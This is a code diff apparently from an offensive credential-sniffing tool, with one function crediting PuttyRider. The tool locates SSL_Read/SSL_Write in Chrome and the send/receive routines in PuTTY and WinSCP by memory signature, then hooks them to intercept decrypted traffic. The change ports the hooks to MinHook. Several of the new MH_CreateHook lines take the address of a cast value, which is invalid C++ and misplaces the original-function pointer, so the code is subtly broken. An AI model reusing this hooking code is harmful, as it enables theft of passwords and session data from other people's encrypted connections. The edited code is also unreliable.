@@ -43,8 +43,8 @@ void HookChrome()
 
 	// Search memory
 
-	DWORD pRead  = Process::SearchSignature((void *)text.dwStartAddress, text.dwSize, (void *)Read_Signature, sizeof(Read_Signature));
-	DWORD pWrite = Process::SearchSignature((void *)text.dwStartAddress, text.dwSize, (void *)Write_Signature, sizeof(Write_Signature));
+	ADDRESS_VALUE pRead  = Process::SearchSignature((void *)text.dwStartAddress, text.dwSize, (void *)Read_Signature, sizeof(Read_Signature));
+	ADDRESS_VALUE pWrite = Process::SearchSignature((void *)text.dwStartAddress, text.dwSize, (void *)Write_Signature, sizeof(Write_Signature));
 
 	if(pRead == 0 || pWrite == 0)
 	{
@@ -57,8 +57,8 @@ void HookChrome()
 	SSL_Read_Original = (SSL_Read_Typedef)pRead;
 	SSL_Write_Original = (SSL_Write_Typedef)pWrite;
 
-	Hooker::AddHook((void *)pRead, (void *)SSL_Read_Callback);
-	Hooker::AddHook((void *)pWrite, (void *)SSL_Write_Callback);
+	MH_CreateHook((void *)pRead, (void *)SSL_Read_Callback, &((void *)pRead));
+	MH_CreateHook((void *)pWrite, (void *)SSL_Write_Callback, &((void *)pWrite));
 }
 
 // Hook Putty - (c) PuttyRider - Adrian Furtuna
@@ -83,8 +83,8 @@ void HookPutty()
 
 	// Serach functions
 
-	DWORD pSend = Process::SearchMemory((void *)text.dwStartAddress, text.dwSize, (void *)SEND_string, 21);
-	DWORD pRecv = Process::SearchMemory((void *)text.dwStartAddress, text.dwSize, (void *)RECV_string, 18);
+	ADDRESS_VALUE pSend = Process::SearchMemory((void *)text.dwStartAddress, text.dwSize, (void *)SEND_string, 21);
+	ADDRESS_VALUE pRecv = Process::SearchMemory((void *)text.dwStartAddress, text.dwSize, (void *)RECV_string, 18);
 
 	if(pSend == 0 || pRecv == 0)
 	{
@@ -97,8 +97,8 @@ void HookPutty()
 	PuttySend_Original = (PuttySend_Typedef)pSend;
 	PuttyRecv_Original = (PuttyRecv_Typedef)pRecv;
 
-	Hooker::AddHook((void *)pSend, (void *)PuttySend_Callback);
-	Hooker::AddHook((void *)pRecv, (void *)PuttyRecv_Callback);
+	MH_CreateHook((void *)pSend, (void *)PuttySend_Callback, &((void *)pSend));
+	MH_CreateHook((void *)pRecv, (void *)PuttyRecv_Callback, &((void *)pRecv));
 }
 
 // Hook WinSCP
@@ -121,8 +121,8 @@ void HookWinSCP()
 
 	// Serach functions
 
-	DWORD pSend = Process::SearchMemory((void *)text.dwStartAddress, text.dwSize, (void *)SEND_string, 15);
-	DWORD pRecv = Process::SearchMemory((void *)text.dwStartAddress, text.dwSize, (void *)RECV_string, 15);
+	ADDRESS_VALUE pSend = Process::SearchMemory((void *)text.dwStartAddress, text.dwSize, (void *)SEND_string, 15);
+	ADDRESS_VALUE pRecv = Process::SearchMemory((void *)text.dwStartAddress, text.dwSize, (void *)RECV_string, 15);
 
 	if(pSend == 0 || pRecv == 0)
 	{
@@ -135,7 +135,7 @@ void HookWinSCP()
 	SSH_Pktsend_Original = (SSH_Pktsend_Typedef)pSend;
 	SSH_Rdpkt_Original = (SSH_Rdpkt_Typedef)pRecv;
 
-	Hooker::AddHook((void *)pSend, (void *)SSH_Pktsend_Callback);
-	Hooker::AddHook((void *)pRecv, (void *)SSH_Rdpkt_Callback);
+	MH_CreateHook((void *)pSend, (void *)SSH_Pktsend_Callback, &((void *)pSend));
+	MH_CreateHook((void *)pRecv, (void *)SSH_Rdpkt_Callback, &((void *)pRecv));
 }
 
